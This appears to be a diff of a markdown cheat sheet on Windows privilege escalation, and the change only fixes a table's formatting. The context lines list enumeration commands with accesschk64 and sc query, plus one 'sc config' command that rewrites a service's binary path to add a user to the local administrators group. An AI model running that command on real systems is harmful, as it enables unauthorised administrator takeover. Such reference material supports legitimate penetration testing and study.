@@ -12,7 +12,7 @@
 | ```icacls.exe <filename.txt>``` | Does the same thing as accesschk64.exe but is native to OS |
 | ```accesschk64.exe -uwcv Everyone *``` | Searches the file system for world-writeable service binaries |
 | ```accesschk64.exe -uwcv <service name>``` | Once you identify a service, get more detail by searching for the single service name |
-| ```sc query <service name>``` | We can gather the binmary path name by using the sc query command
+| ```sc query <service name>``` | We can gather the binmary path name by using the sc query command |
 | ```sc config <service name> binpath= "net localgroup administrators <username> /add"``` | Modify binpath |
  
 | Check | Description |
